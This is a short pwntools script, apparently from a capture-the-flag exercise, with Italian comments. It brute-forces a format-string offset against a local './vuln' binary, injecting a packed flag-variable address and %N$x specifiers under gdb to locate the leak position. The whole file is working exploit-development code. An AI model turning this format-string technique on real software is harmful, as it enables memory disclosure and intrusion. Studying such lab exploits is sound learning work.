# sudo apt install gdb gdbserver
# pip3 install pwn

# metodo dicesi ad cazzum: non consigliato

from tkinter import E
from pwn import *

context.log_level = 'WARNING'

#context.terminal = ['tmux', 'splitw', '-h']

################## addresses #########################

# gef➤  info variables flag
# All variables matching regular expression flag:
# 
# Non-debugging symbols:
# 0x0804c028  flag

FLAG = 0x804c024

diff =  0xffffd696 - 0xffffd360
pos = diff // 4
print(diff, pos)

for i in range(100, 250):

    EXPL = b""
    EXPL += b"A"*4
    EXPL += p32(FLAG)
    EXPL += b"B"*7
    EXPL += b"\n"

    EXPL += f"here: %{i}$x\n".encode("utf-8")
    #for i in range(149, 180):
    #    EXPL += f"{i} %{i}$x\n".encode("utf-8")

    #print(f"Expl len: {len(EXPL):x}")


    p = process(['./vuln', EXPL])
    gdb.attach(p, '''
    b *(main+79)
    grep AAAA
    print $esp
    ''')

    p.sendline(b"")
    p.recvuntil(b"here: ")
    leak = p.recvline().strip()
    print(f"{i}: {leak}")

    #if b"4141" in leak:
    #    break
    if hex(FLAG)[2:].encode("utf-8") in leak:
        break
    p.close()

p.interactive()